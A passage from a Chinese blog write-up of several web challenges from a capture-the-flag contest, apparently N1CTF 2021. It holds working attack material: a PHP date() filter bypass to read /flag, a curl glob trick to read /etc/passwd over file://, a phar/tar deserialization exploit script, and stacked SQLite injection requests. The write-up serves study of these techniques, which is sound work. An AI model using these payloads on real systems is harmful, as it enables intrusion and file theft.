class="number">12</span></div><div class="line">t指定的月份有几天<span class="number">28</span> 到 <span class="number">31</span></div><div class="line">年------</div><div class="line">L是否为闰年如果是闰年为 <span class="number">1</span>，否则为 <span class="number">0</span></div><div class="line">oISO<span class="number">-8601</span> 格式年份数字。这和 Y 的值相同，只除了如果 ISO 的星期数（W）属于前一年或下一年，则用那一年。（PHP <span class="number">5.1</span><span class="number">.0</span> 新加）Examples: <span class="number">1999</span> <span class="keyword">or</span> <span class="number">2003</span></div><div class="line">Y<span class="number">4</span> 位数字完整表示的年份例如：<span class="number">1999</span> 或 <span class="number">2003</span></div><div class="line">y<span class="number">2</span> 位数字表示的年份例如：<span class="number">99</span> 或 <span class="number">03</span></div><div class="line">时间------</div><div class="line">a小写的上午和下午值am 或 pm</div><div class="line">A大写的上午和下午值AM 或 PM</div><div class="line">BSwatch Internet 标准时<span class="number">000</span> 到 <span class="number">999</span></div><div class="line">g小时，<span class="number">12</span> 小时格式，没有前导零<span class="number">1</span> 到 <span class="number">12</span></div><div class="line">G小时，<span class="number">24</span> 小时格式，没有前导零<span class="number">0</span> 到 <span class="number">23</span></div><div class="line">h小时，<span class="number">12</span> 小时格式，有前导零<span class="number">01</span> 到 <span class="number">12</span></div><div class="line">H小时，<span class="number">24</span> 小时格式，有前导零<span class="number">00</span> 到 <span class="number">23</span></div><div class="line">i有前导零的分钟数<span class="number">00</span> 到 <span class="number">59</span>&gt;</div><div class="line">s秒数，有前导零<span class="number">00</span> 到 <span class="number">59</span>&gt;</div><div class="line">u毫秒 （PHP <span class="number">5.2</span><span class="number">.2</span> 新加）。需要注意的是 date() 函数总是返回 <span class="number">000000</span> 因为它只接受 integer 参数， 而 DateTime::format() 才支持毫秒。示例: <span class="number">654321</span></div><div class="line">时区------</div><div class="line">e时区标识（PHP <span class="number">5.1</span><span class="number">.0</span> 新加）例如：UTC，GMT，Atlantic/Azores</div><div class="line">I是否为夏令时如果是夏令时为 <span class="number">1</span>，否则为 <span class="number">0</span></div><div class="line">O与格林威治时间相差的小时数例如：+<span class="number">0200</span></div><div class="line">P与格林威治时间（GMT）的差别，小时和分钟之间有冒号分隔（PHP <span class="number">5.1</span><span class="number">.3</span> 新加）例如：+<span class="number">02</span>:<span class="number">00</span></div><div class="line">T本机所在的时区例如：EST，MDT（【译者注】在 Windows 下为完整文本格式，例如“Eastern Standard Time”，中文版会显示“中国标准时间”）。</div><div class="line">Z时差偏移量的秒数。UTC 西边的时区偏移量总是负的，UTC 东边的时区偏移量总是正的。<span class="number">-43200</span> 到 <span class="number">43200</span></div><div class="line">完整的日期／时间------</div><div class="line">cISO <span class="number">8601</span> 格式的日期（PHP <span class="number">5</span> 新加）<span class="number">2004</span><span class="number">-02</span><span class="number">-12</span>T15:<span class="number">19</span>:<span class="number">21</span>+<span class="number">00</span>:<span class="number">00</span></div><div class="line">rRFC <span class="number">822</span> 格式的日期例如：Thu, <span class="number">21</span> Dec <span class="number">2000</span> <span class="number">16</span>:<span class="number">01</span>:<span class="number">07</span> +<span class="number">0200</span></div><div class="line">U从 Unix 纪元（January <span class="number">1</span> <span class="number">1970</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> GMT）开始至今的秒数参见 time()</div></pre></td></tr></table></figure><p>所以如果直接传入/flag的话，lag会被格式化为其他内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">php &gt; <span class="keyword">echo</span> date(<span class="string">"/flag"</span>);</div><div class="line">/fTuesdayam10</div></pre></td></tr></table></figure><p>这里还有urldecode，所以将/flag进行url编码后再传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">php &gt; echo date(&quot;/%66%6c%61%67&quot;);</div><div class="line">/%66%62021-11-23T10:23:29+08:00%61%67</div></pre></td></tr></table></figure><p>看到c也会被格式化</p><p>又在官方文档当中看到，可以使用转义符<code>\</code>进行转义：</p><p><img src="http://pic.c1imber.top/blog/20211123/zhIiktnmnP5a.png?imageslim" alt="mark"></p><p>所以可以使用：</p><p><code>/%66%6\c%61%67</code></p><p>或者直接：</p><p><code>/f\l\a\g</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">php &gt; <span class="keyword">echo</span> date(<span class="string">"/f\l\a\g"</span>);</div><div class="line">/flag</div><div class="line">php &gt; <span class="keyword">echo</span> urldecode(date(<span class="string">"/%66%6\c%61%67"</span>));</div><div class="line">/flag</div></pre></td></tr></table></figure><p>获取flag<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /?time=<span class="number">111</span> HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">43.155</span><span class="number">.64</span><span class="number">.70</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment">Cache-Control: max-age=0</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></div><div class="line"><span class="comment">Content-Length: 14</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">/%66%6\c%61%67</span></div></pre></td></tr></table></figure></p><p><img src="http://pic.c1imber.top/blog/20211123/BQQHbPxkSVtf.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/<span class="number">1.1</span></div><div class="line">Host: <span class="number">43.155</span><span class="number">.64</span><span class="number">.70</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment">Cache-Control: max-age=0</span></div><div class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></div><div class="line"><span class="comment">Content-Length: 41</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">path=/var/www/tmp/1637634632190067238.txt</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211123/G6kmMRv9GjRG.png?imageslim" alt="mark"></p><p><code>n1ctf{bypass_date_1s_s000_eassssy}</code></p><p><strong>其它web题目复盘</strong></p><h3 id="Funny-web"><a href="#Funny-web" class="headerlink" title="Funny_web"></a>Funny_web</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="comment">//hint in /hint.txt</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">"url"</span>])) &#123;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">uuid</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $chars = md5(uniqid(mt_rand(), <span class="keyword">true</span>));</div><div class="line">    $uuid = substr($chars, <span class="number">0</span>, <span class="number">8</span>) . <span class="string">'-'</span></div><div class="line">        . substr($chars, <span class="number">8</span>, <span class="number">4</span>) . <span class="string">'-'</span></div><div class="line">        . substr($chars, <span class="number">12</span>, <span class="number">4</span>) . <span class="string">'-'</span></div><div class="line">        . substr($chars, <span class="number">16</span>, <span class="number">4</span>) . <span class="string">'-'</span></div><div class="line">        . substr($chars, <span class="number">20</span>, <span class="number">12</span>);</div><div class="line">    <span class="keyword">return</span> $uuid;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">($url)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $blacklist = <span class="string">"/l|g|[\x01-\x1f]|[\x7f-\xff]|['\"]/i"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (is_string($url)</div><div class="line">        &amp;&amp; strlen($url) &lt; <span class="number">4096</span></div><div class="line">        &amp;&amp; !preg_match($blacklist, $url)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">"uuid"</span>])) &#123;</div><div class="line">    $_SESSION[<span class="string">"uuid"</span>] = uuid();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $_SESSION[<span class="string">"uuid"</span>].<span class="string">"&lt;/br&gt;"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (Check($_POST[<span class="string">"url"</span>])) &#123;</div><div class="line">    $url = escapeshellarg($_POST[<span class="string">"url"</span>]);</div><div class="line">    $cmd = <span class="string">"/usr/bin/curl $&#123;url&#125; --output - -m 3 --connect-timeout 3"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"your command: "</span> . $cmd . <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">    $res = shell_exec($cmd);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"error~"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (strpos($res, $_SESSION[<span class="string">"uuid"</span>]) !== <span class="keyword">false</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> $res;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you cannot get the result~"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>当时没做出来，看了wp，学到了两个有意思的trick</p><p><strong>trick1：</strong>需要先通过<code>curl file://</code>读取<code>/hint.txt</code>的提示，但是<code>/l|g|[\x01-\x1f]|[\x7f-\xff]|[&#39;\&quot;]/i&quot;</code>过滤了l，所以不能直接用<code>file</code>协议去读</p><p>这里需要用到curl的一个trick，就是在curl当中，默认支持glob通配符<code>[]</code>和<code>{}</code>的使用，多提一点：如果不想使用这两个glob通配符，需要加上<code>-g</code>选项</p><p><code>-g/--globoff       Disable URL sequences and ranges using {} and []</code></p><p>所以可以有下面的用法：<br>curl版本：7.58.0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="keyword">fi</span>&#123;k,l,m&#125;e:///etc/passwd</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211127/6OT5JeCvGpV4.png?imageslim" alt="mark"></p><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="keyword">fi</span>[k-m]e:///etc/passwd</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211127/M9OJNx5WglLb.png?imageslim" alt="mark"></p><p>（curl 7.47.0失败）</p><p>trick2：gopher打mssql</p><p><img src="http://pic.c1imber.top/blog/20211127/xLTfRXQeV8xK.png?imageslim" alt="mark"></p><p>(这里直接用的出题人的脚本，回头单独研究一下如何构造gopher mssql流量,应该会单独写一篇文章)</p><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</div><div class="line"><span class="keyword">include_once</span> <span class="string">"log.php"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(file_exists(@$_GET[<span class="string">"file"</span>]))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"file exist!"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"file not exist!"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>log.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">define(<span class="string">'ROOT_PATH'</span>, dirname(<span class="keyword">__FILE__</span>));</div><div class="line"></div><div class="line">$log_type = @$_GET[<span class="string">'log_type'</span>];</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($log_type))&#123;</div><div class="line">    $log_type = <span class="string">"look"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$gets = http_build_query($_REQUEST);</div><div class="line"></div><div class="line">$real_ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">$log_ip_dir = ROOT_PATH . <span class="string">'/log/'</span> . $real_ip;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!is_dir($log_ip_dir))&#123;</div><div class="line">    mkdir($log_ip_dir, <span class="number">0777</span>, <span class="keyword">true</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$log = <span class="string">'Time: '</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">' IP: ['</span> . @$_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] . <span class="string">'], REQUEST: ['</span> . $gets . <span class="string">'], CONTENT: ['</span> . file_get_contents(<span class="string">'php://input'</span>) . <span class="string">"]\n"</span>;</div><div class="line">$log_file = $log_ip_dir . <span class="string">'/'</span> . $log_type . <span class="string">'_www.log'</span>;</div><div class="line"></div><div class="line">file_put_contents($log_file, $log, FILE_APPEND);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">CLASS</span> <span class="title">FLAG</span> </span>&#123;</div><div class="line">    <span class="keyword">private</span> $_flag = <span class="string">'n1ctf&#123;************************&#125;'</span>;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"FLAG: "</span> . <span class="keyword">$this</span>-&gt;_flag;</div><div class="line">    &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure><p>题目乍一看很简单，就是通过序列化FLAG类构造phar data写入log，然后通过<code>phar://</code>协议触发反序列化读取flag</p><p>但是这里有个问题，就是写入的phar data前会有<code>&#39;Time: &#39; . date(&#39;Y-m-d H:i:s&#39;) . &#39; IP: [&#39; . @$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] . &#39;], REQUEST: [&#39; . $gets . &#39;], CONTENT: [&#39;</code>这串内容，之后还会有<code>]\n</code>，所以如果直接写入的话，phar data的签名校验会失败导致反序列化失败，并且使用正常方法生成的phar data文件必须以GBMB结尾才能被反序列化，而这里写入log后结尾变成了<code>]\n</code>，是不能反序列化成功的</p><p>这里需要用到另一种方式生成payload，其实很早之前的一篇文章就已经提到了，一直没看到</p><p>链接：<a href="https://blog.shpik.kr/php,/unserialize,/rce/2019/02/18/PHP_Exploitation_using_FILE_Function.html" target="_blank" rel="external">https://blog.shpik.kr/php,/unserialize,/rce/2019/02/18/PHP_Exploitation_using_FILE_Function.html</a></p><p>该文章中提到的方法通过PharData生成可以被反序列化的tar包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$phar = <span class="keyword">new</span> PharData(<span class="string">"get_flag.tar"</span>);</div><div class="line">$phar[<span class="string">"AAABshpik"</span>] = <span class="string">"FLAGFLAGFLAG"</span>;</div><div class="line">$obj = <span class="keyword">new</span> xxxClass(xxx);</div><div class="line">$phar-&gt;setMetadata($obj);</div></pre></td></tr></table></figure><p>这种方式生成的文件，文件尾部的内容是不会影响tar文件的格式和反序列化的</p><p>如何添加头部并更新签名，这篇文章也给了脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcChecksum</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> sum(struct.unpack_from(<span class="string">"148B8x356B"</span>,data))+<span class="number">256</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"argv[1] is filename\nargv[2] is output filename.\n"</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>],<span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">data = f.read()</div><div class="line"><span class="comment"># Make new checksum</span></div><div class="line">new_name = <span class="string">"\xFF\xD8\xFF\xDBshpik"</span>.ljust(<span class="number">100</span>,<span class="string">'\x00'</span>)</div><div class="line">new_data = new_name + data[<span class="number">100</span>:]</div><div class="line">checksum = calcChecksum(new_data)</div><div class="line">new_checksum = oct(checksum).rjust(<span class="number">7</span>,<span class="string">'0'</span>)+<span class="string">'\x00'</span></div><div class="line">new_data = new_name + data[<span class="number">100</span>:<span class="number">148</span>] + new_checksum + data[<span class="number">156</span>:]</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">2</span>],<span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">f.write(new_data)</div></pre></td></tr></table></figure><p>根据这个脚本修改一下</p><p>getflag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">CLASS</span> <span class="title">FLAG</span> </span>&#123;</div><div class="line">    <span class="comment">//private $_flag = 'n1ctf&#123;************************&#125;';</span></div><div class="line">    <span class="comment">//public function __destruct()&#123;</span></div><div class="line">    <span class="comment">//    echo "FLAG: " . $this-&gt;_flag;</span></div><div class="line">    <span class="comment">//&#125; </span></div><div class="line">&#125;</div><div class="line"></div><div class="line">$phar = <span class="keyword">new</span> PharData(<span class="string">"get_flag.tar"</span>);</div><div class="line">$phar[<span class="string">"AAABshpik"</span>] = <span class="string">"FLAGFLAGFLAG"</span>;</div><div class="line">$obj = <span class="keyword">new</span> FLAG();</div><div class="line">$phar-&gt;setMetadata($obj);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> date(<span class="string">'Y-m-d H:i:s'</span>);</div></pre></td></tr></table></figure><p>getflag.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcChecksum</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> sum(struct.unpack_from(<span class="string">"148B8x356B"</span>,data))+<span class="number">256</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    logpre = <span class="string">"Time: "</span> + os.popen(<span class="string">"php getflag.php"</span>).read() + <span class="string">" IP: [], REQUEST: [], CONTENT: ["</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">"get_flag.tar"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">        data = f.read()</div><div class="line">    f.close()</div><div class="line">    <span class="comment"># Make new checksum</span></div><div class="line">    new_name = logpre.ljust(<span class="number">100</span>,<span class="string">'\x00'</span>)</div><div class="line">    new_data = new_name + data[<span class="number">100</span>:]</div><div class="line">    checksum = calcChecksum(new_data)</div><div class="line">    new_checksum = oct(checksum).rjust(<span class="number">7</span>,<span class="string">'0'</span>)+<span class="string">'\x00'</span></div><div class="line">    new_data = new_name + data[<span class="number">100</span>:<span class="number">148</span>] + new_checksum + data[<span class="number">156</span>:]</div><div class="line"></div><div class="line">    <span class="keyword">with</span> open(<span class="string">"new_get_flag.tar"</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(new_data)</div><div class="line">    </div><div class="line">    f.close()</div><div class="line"></div><div class="line">    <span class="keyword">with</span> open(<span class="string">"new_get_flag.tar"</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">        phardata=f.read().split(<span class="string">"CONTENT: ["</span>)[<span class="number">1</span>]</div><div class="line">        <span class="keyword">print</span> phardata</div><div class="line"></div><div class="line">    f.close()</div><div class="line"></div><div class="line">    requests.post(url=<span class="string">"http://192.168.157.141/easyphp/index.php"</span>,data=phardata)</div><div class="line">    <span class="keyword">print</span> requests.get(url=<span class="string">"http://192.168.157.141/easyphp/index.php?file=phar://./log/192.168.157.141/look_www.log&amp;log_type=../xxx"</span>).text</div></pre></td></tr></table></figure><p>本地测试结果：</p><p><img src="http://pic.c1imber.top/blog/20211127/m6ITUqnId2XS.png?imageslim" alt="mark"></p><h3 id="QQQueryyy-All-The-Things"><a href="#QQQueryyy-All-The-Things" class="headerlink" title="QQQueryyy All The Things"></a>QQQueryyy All The Things</h3><p>这道题当时做的只知道是sqlite数据库，支持堆叠注入</p><p>查看版本号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /?str=111%27;<span class="keyword">select</span>%<span class="number">20</span>sqlite_version();<span class="keyword">select</span>%<span class="number">20</span>%<span class="number">271234</span> <span class="keyword">HTTP</span>/<span class="number">1.1</span></div><div class="line">Host: <span class="number">8.218</span><span class="number">.140</span><span class="number">.54</span>:<span class="number">12321</span></div><div class="line"><span class="keyword">User</span>-<span class="keyword">Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"><span class="keyword">Cache</span>-Control: <span class="keyword">max</span>-age=<span class="number">0</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20211127/2XmU1fDeT0Ul.png?imageslim" alt="mark"></p><p>查询出所有表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /index.php?str=111%27;<span class="keyword">select</span>%<span class="number">20</span>*%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>sqlite_temp_master;<span class="keyword">select</span>%<span class="number">20</span>%<span class="number">271234</span> <span class="keyword">HTTP</span>/<span class="number">1.1</span></div><div class="line">Host: <span class="number">8.218</span><span class="number">.140</span><span class="number">.54</span>:<span class="number">12321</span></div><div class="line"><span class="keyword">User</span>-<span class="keyword">Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"><span class="keyword">Cache</span>-Control: <span class="keyword">max</span>-age=<span class="number">0</span></div></pre></td></tr></table></figure><p>获得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div 